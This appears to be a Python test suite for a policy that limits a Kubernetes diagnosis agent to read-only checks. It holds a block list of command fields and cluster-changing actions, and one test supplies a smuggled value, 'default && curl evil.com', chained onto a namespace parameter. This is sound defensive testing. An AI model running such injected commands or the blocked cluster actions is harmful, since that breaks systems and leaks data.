"""Policy tests for incident diagnosis loop.

Tests:
1. Known read-only check IDs are accepted
2. Unknown check IDs are rejected
3. Mutation/remediation check IDs are rejected
4. Direct command fields are rejected
5. Arbitrary kubectl text is rejected as executable input
6. Excessive check proposals are bounded by max_checks_per_pass
7. Unsafe parameters are rejected or stripped
8. Rejection reasons are present and bounded
"""

from __future__ import annotations

import unittest

from k8s_diag_agent.collect.incident_next_check_policy import (
    DISALLOWED_ACTIONS,
    FORBIDDEN_COMMAND_FIELDS,
    MUTATION_CHECK_IDS,
    READ_ONLY_CHECK_REGISTRY,
    CheckValidationResult,
    NextCheckPolicy,
    strip_forbidden_fields,
    validate_next_check_proposal,
    validate_next_check_proposals,
)


class TestPolicyConstants(unittest.TestCase):
    """Policy constant tests."""

    def test_read_only_registry_is_defined(self) -> None:
        """READ_ONLY_CHECK_REGISTRY is defined."""
        self.assertIsInstance(READ_ONLY_CHECK_REGISTRY, dict)
        self.assertGreater(len(READ_ONLY_CHECK_REGISTRY), 0)

    def test_read_only_registry_keys_are_strings(self) -> None:
        """All registry keys are strings."""
        for key in READ_ONLY_CHECK_REGISTRY:
            self.assertIsInstance(key, str)

    def test_read_only_registry_entries_have_required_fields(self) -> None:
        """Registry entries have required fields."""
        for check_id, entry in READ_ONLY_CHECK_REGISTRY.items():
            self.assertIn("read_only", entry)
            self.assertIn("allowed_parameters", entry)
            self.assertEqual(entry["read_only"], True)

    def test_mutation_check_ids_defined(self) -> None:
        """MUTATION_CHECK_IDS is defined."""
        self.assertIsInstance(MUTATION_CHECK_IDS, frozenset)
        self.assertGreater(len(MUTATION_CHECK_IDS), 0)

    def test_forbidden_command_fields_defined(self) -> None:
        """FORBIDDEN_COMMAND_FIELDS is defined."""
        self.assertIsInstance(FORBIDDEN_COMMAND_FIELDS, frozenset)
        self.assertIn("command", FORBIDDEN_COMMAND_FIELDS)
        self.assertIn("kubectl", FORBIDDEN_COMMAND_FIELDS)
        self.assertIn("exec", FORBIDDEN_COMMAND_FIELDS)

    def test_disallowed_actions_defined(self) -> None:
        """DISALLOWED_ACTIONS is defined."""
        self.assertIsInstance(DISALLOWED_ACTIONS, list)
        self.assertIn("execute_arbitrary_command", DISALLOWED_ACTIONS)
        self.assertIn("mutate_cluster", DISALLOWED_ACTIONS)


class TestKnownReadOnlyChecks(unittest.TestCase):
    """Tests for known read-only check IDs."""

    def test_pod_logs_accepted(self) -> None:
        """pod_logs is accepted."""
        proposal = {"check_id": "pod_logs", "title": "Read pod logs"}
        result = validate_next_check_proposal(proposal)

        self.assertTrue(result.accepted)
        self.assertIsNotNone(result.validated_check)
        self.assertEqual(result.validated_check["check_id"], "pod_logs")

    def test_pod_events_accepted(self) -> None:
        """pod_events is accepted."""
        proposal = {"check_id": "pod_events", "title": "Read pod events"}
        result = validate_next_check_proposal(proposal)

        self.assertTrue(result.accepted)

    def test_deployment_status_accepted(self) -> None:
        """deployment_status is accepted."""
        proposal = {"check_id": "deployment_status", "title": "Read deployment"}
        result = validate_next_check_proposal(proposal)

        self.assertTrue(result.accepted)

    def test_node_status_accepted(self) -> None:
        """node_status is accepted."""
        proposal = {"check_id": "node_status", "title": "Read node"}
        result = validate_next_check_proposal(proposal)

        self.assertTrue(result.accepted)

    def test_all_registry_checks_accepted(self) -> None:
        """All checks in registry are accepted."""
        for check_id in READ_ONLY_CHECK_REGISTRY:
            proposal = {"check_id": check_id, "title": f"Check {check_id}"}
            result = validate_next_check_proposal(proposal)

            self.assertTrue(result.accepted, f"Check {check_id} should be accepted")


class TestUnknownCheckIDs(unittest.TestCase):
    """Tests for unknown check IDs."""

    def test_unknown_check_id_rejected(self) -> None:
        """Unknown check ID is rejected."""
        proposal = {"check_id": "unknown_check", "title": "Unknown"}
        result = validate_next_check_proposal(proposal)

        self.assertFalse(result.accepted)
        self.assertIsNotNone(result.rejection_reason)
        self.assertIn("not in read-only registry", result.rejection_reason)

    def test_arbitrary_string_rejected(self) -> None:
        """Arbitrary string as check_id is rejected."""
        proposal = {"check_id": "kubectl get pods", "title": "Run command"}
        result = validate_next_check_proposal(proposal)

        self.assertFalse(result.accepted)

    def test_malformed_check_id_rejected(self) -> None:
        """Malformed check_id is rejected."""
        proposal = {"check_id": "random-command-123", "title": "Random"}
        result = validate_next_check_proposal(proposal)

        self.assertFalse(result.accepted)


class TestMutationCheckIDs(unittest.TestCase):
    """Tests for mutation/remediation check IDs."""

    def test_kubectl_exec_rejected(self) -> None:
        """kubectl_exec is rejected."""
        proposal = {"check_id": "kubectl_exec", "title": "Exec into pod"}
        result = validate_next_check_proposal(proposal)

        self.assertFalse(result.accepted)
        self.assertTrue(result.safety_blocked)

    def test_kubectl_apply_rejected(self) -> None:
        """kubectl_apply is rejected."""
        proposal = {"check_id": "kubectl_apply", "title": "Apply manifest"}
        result = validate_next_check_proposal(proposal)

        self.assertFalse(result.accepted)
        self.assertTrue(result.safety_blocked)

    def test_restart_pod_rejected(self) -> None:
        """restart_pod is rejected."""
        proposal = {"check_id": "restart_pod", "title": "Restart pod"}
        result = validate_next_check_proposal(proposal)

        self.assertFalse(result.accepted)
        self.assertTrue(result.safety_blocked)

    def test_scale_deployment_rejected(self) -> None:
        """scale_deployment is rejected."""
        proposal = {"check_id": "scale_deployment", "title": "Scale"}
        result = validate_next_check_proposal(proposal)

        self.assertFalse(result.accepted)
        self.assertTrue(result.safety_blocked)

    def test_execute_command_rejected(self) -> None:
        """execute_command is rejected."""
        proposal = {"check_id": "execute_command", "title": "Execute"}
        result = validate_next_check_proposal(proposal)

        self.assertFalse(result.accepted)
        self.assertTrue(result.safety_blocked)


class TestForbiddenCommandFields(unittest.TestCase):
    """Tests for forbidden command fields."""

    def test_command_field_rejected(self) -> None:
        """Proposal with command field is rejected."""
        proposal = {
            "check_id": "pod_logs",
            "title": "Read logs",
            "command": "kubectl logs pod-xyz",
        }
        result = validate_next_check_proposal(proposal)

        self.assertFalse(result.accepted)
        self.assertTrue(result.safety_blocked)
        self.assertIn("command", result.rejection_reason)

    def test_kubectl_field_rejected(self) -> None:
        """Proposal with kubectl field is rejected."""
        proposal = {
            "check_id": "pod_logs",
            "title": "Read logs",
            "kubectl": "get pods",
        }
        result = validate_next_check_proposal(proposal)

        self.assertFalse(result.accepted)
        self.assertTrue(result.safety_blocked)

    def test_shell_field_rejected(self) -> None:
        """Proposal with shell field is rejected."""
        proposal = {
            "check_id": "pod_logs",
            "title": "Read logs",
            "shell": "bash -c 'echo test'",
        }
        result = validate_next_check_proposal(proposal)

        self.assertFalse(result.accepted)
        self.assertTrue(result.safety_blocked)

    def test_exec_field_rejected(self) -> None:
        """Proposal with exec field is rejected."""
        proposal = {
            "check_id": "pod_logs",
            "title": "Read logs",
            "exec": "some command",
        }
        result = validate_next_check_proposal(proposal)

        self.assertFalse(result.accepted)
        self.assertTrue(result.safety_blocked)

    def test_apply_field_rejected(self) -> None:
        """Proposal with apply field is rejected."""
        proposal = {
            "check_id": "pod_logs",
            "title": "Read logs",
            "apply": "manifest.yaml",
        }
        result = validate_next_check_proposal(proposal)

        self.assertFalse(result.accepted)
        self.assertTrue(result.safety_blocked)

    def test_delete_field_rejected(self) -> None:
        """Proposal with delete field is rejected."""
        proposal = {
            "check_id": "pod_logs",
            "title": "Read logs",
            "delete": "pod-xyz",
        }
        result = validate_next_check_proposal(proposal)

        self.assertFalse(result.accepted)
        self.assertTrue(result.safety_blocked)


class TestArbitraryKubectlText(unittest.TestCase):
    """Tests for arbitrary kubectl text rejection."""

    def test_kubectl_in_parameters_rejected(self) -> None:
        """kubectl command string in parameters is stripped."""
        proposal = {
            "check_id": "pod_logs",
            "title": "Read logs",
            "parameters": {
                "namespace": "default",
                "command": "kubectl get pods",  # This should be stripped
            },
        }
        result = validate_next_check_proposal(proposal)

        # The check is accepted but command param is stripped
        self.assertTrue(result.accepted)
        if result.validated_check and "parameters" in result.validated_check:
            self.assertNotIn("command", result.validated_check["parameters"])

    def test_shell_pattern_in_string_rejected(self) -> None:
        """Shell patterns in string values are stripped."""
        proposal = {
            "check_id": "pod_logs",
            "title": "Read logs",
            "parameters": {
                "namespace": "default && curl evil.com",  # Shell pattern
            },
        }
        result = validate_next_check_proposal(proposal)

        # Check accepted but dangerous value is stripped
        self.assertTrue(result.accepted)


class TestExcessiveChecks(unittest.TestCase):
    """Tests for excessive check proposals bounds."""

    def test_excessive_proposals_truncated(self) -> None:
        """Excessive proposals are bounded by max_checks_per_pass."""
        proposals = [
            {"check_id": "pod_logs", "title": f"Check {i}"}
            for i in range(10)
        ]

        accepted, results = validate_next_check_proposals(proposals, max_checks_per_pass=5)

        self.assertEqual(len(accepted), 5)
        self.assertEqual(len(results), 10)

    def test_all_checks_accepted_under_limit(self) -> None:
        """All checks accepted when under limit."""
        proposals = [
            {"check_id": "pod_logs", "title": "Check 1"},
            {"check_id": "pod_events", "title": "Check 2"},
            {"check_id": "deployment_status", "title": "Check 3"},
        ]

        accepted, results = validate_next_check_proposals(proposals, max_checks_per_pass=5)

        self.assertEqual(len(accepted), 3)
        self.assertTrue(all(r.accepted for r in results))

    def test_excess_rejections_have_reasons(self) -> None:
        """Excess rejections have proper reasons."""
        proposals = [
            {"check_id": "pod_logs", "title": f"Check {i}"}
            for i in range(7)
        ]

        accepted, results = validate_next_check_proposals(proposals, max_checks_per_pass=5)

        # Last 2 should be rejected with excess reason
        for result in results[5:]:
            self.assertFalse(result.accepted)
            self.assertIn("max_checks_per_pass", result.rejection_reason)


class TestParameterValidation(unittest.TestCase):
    """Tests for parameter validation."""

    def test_allowed_parameters_accepted(self) -> None:
        """Allowed parameters are accepted."""
        proposal = {
            "check_id": "pod_logs",
            "title": "Read logs",
            "parameters": {
                "namespace": "default",
                "object_name": "test-pod",
                "tail_lines": 100,
            },
        }
        result = validate_next_check_proposal(proposal)

        self.assertTrue(result.accepted)
        if result.validated_check and "parameters" in result.validated_check:
            params = result.validated_check["parameters"]
            self.assertIn("namespace", params)
            self.assertIn("object_name", params)

    def test_unknown_parameters_stripped(self) -> None:
        """Unknown parameters are stripped."""
        proposal = {
            "check_id": "pod_logs",
            "title": "Read logs",
            "parameters": {
                "namespace": "default",
                "unknown_param": "value",
            },
        }
        result = validate_next_check_proposal(proposal)

        self.assertTrue(result.accepted)
        if result.validated_check and "parameters" in result.validated_check:
            self.assertNotIn("unknown_param", result.validated_check["parameters"])

    def test_int_parameters_accepted(self) -> None:
        """Integer parameters are accepted."""
        proposal = {
            "check_id": "pod_logs",
            "title": "Read logs",
            "parameters": {
                "namespace": "default",
                "tail_lines": 50,
            },
        }
        result = validate_next_check_proposal(proposal)

        self.assertTrue(result.accepted)

    def test_bool_parameters_accepted(self) -> None:
        """Boolean parameters are accepted."""
        proposal = {
            "check_id": "pod_logs",
            "title": "Read logs",
            "parameters": {
                "namespace": "default",
                "previous": True,
            },
        }
        result = validate_next_check_proposal(proposal)

        self.assertTrue(result.accepted)


class TestStripForbiddenFields(unittest.TestCase):
    """Tests for strip_forbidden_fields function."""

    def test_strips_command_field(self) -> None:
        """command field is stripped."""
        proposal = {"check_id": "pod_logs", "command": "kubectl exec"}
        result = strip_forbidden_fields(proposal)

        self.assertNotIn("command", result)
        self.assertIn("check_id", result)

    def test_strips_kubectl_field(self) -> None:
        """kubectl field is stripped."""
        proposal = {"check_id": "pod_logs", "kubectl": "get pods"}
        result = strip_forbidden_fields(proposal)

        self.assertNotIn("kubectl", result)

    def test_preserves_safe_fields(self) -> None:
        """Safe fields are preserved."""
        proposal = {
            "check_id": "pod_logs",
            "title": "Read logs",
            "rationale": "Need to check logs",
            "priority": 1,
        }
        result = strip_forbidden_fields(proposal)

        self.assertEqual(result["check_id"], "pod_logs")
        self.assertEqual(result["title"], "Read logs")
        self.assertEqual(result["rationale"], "Need to check logs")
        self.assertEqual(result["priority"], 1)

    def test_strips_mutation_check_id(self) -> None:
        """Mutation check_id is stripped entirely."""
        proposal = {"check_id": "kubectl_exec", "title": "Exec"}
        result = strip_forbidden_fields(proposal)

        self.assertNotIn("check_id", result)


class TestPolicyClass(unittest.TestCase):
    """Tests for NextCheckPolicy class."""

    def test_policy_disallowed_actions(self) -> None:
        """Policy returns disallowed_actions."""
        policy = NextCheckPolicy()
        self.assertIsInstance(policy.disallowed_actions, list)
        self.assertIn("mutate_cluster", policy.disallowed_actions)

    def test_policy_allowed_actions(self) -> None:
        """Policy returns empty allowed_actions."""
        policy = NextCheckPolicy()
        self.assertEqual(policy.allowed_actions, [])
        self.assertIsInstance(policy.allowed_actions, list)

    def test_policy_read_only(self) -> None:
        """Policy returns read_only=True."""
        policy = NextCheckPolicy()
        self.assertEqual(policy.read_only, True)

    def test_policy_validate(self) -> None:
        """Policy.validate() works."""
        policy = NextCheckPolicy(max_checks_per_pass=3)
        proposals = [
            {"check_id": "pod_logs", "title": "Logs"},
            {"check_id": "pod_events", "title": "Events"},
        ]

        accepted, results = policy.validate(proposals)

        self.assertEqual(len(accepted), 2)


class TestValidationResult(unittest.TestCase):
    """Tests for CheckValidationResult."""

    def test_accepted_result_to_dict(self) -> None:
        """Accepted result.to_dict() works."""
        result = CheckValidationResult(
            accepted=True,
            validated_check={"check_id": "pod_logs"},
            rejection_reason=None,
            check_id="pod_logs",
            safety_blocked=False,
        )

        d = result.to_dict()
        self.assertEqual(d["accepted"], True)
        self.assertEqual(d["check_id"], "pod_logs")
        self.assertIsNone(d["rejection_reason"])

    def test_rejected_result_to_dict(self) -> None:
        """Rejected result.to_dict() works."""
        result = CheckValidationResult(
            accepted=False,
            validated_check=None,
            rejection_reason="not in registry",
            check_id="unknown",
            safety_blocked=False,
        )

        d = result.to_dict()
        self.assertEqual(d["accepted"], False)
        self.assertEqual(d["rejection_reason"], "not in registry")
        self.assertEqual(d["check_id"], "unknown")


if __name__ == "__main__":
    unittest.main()
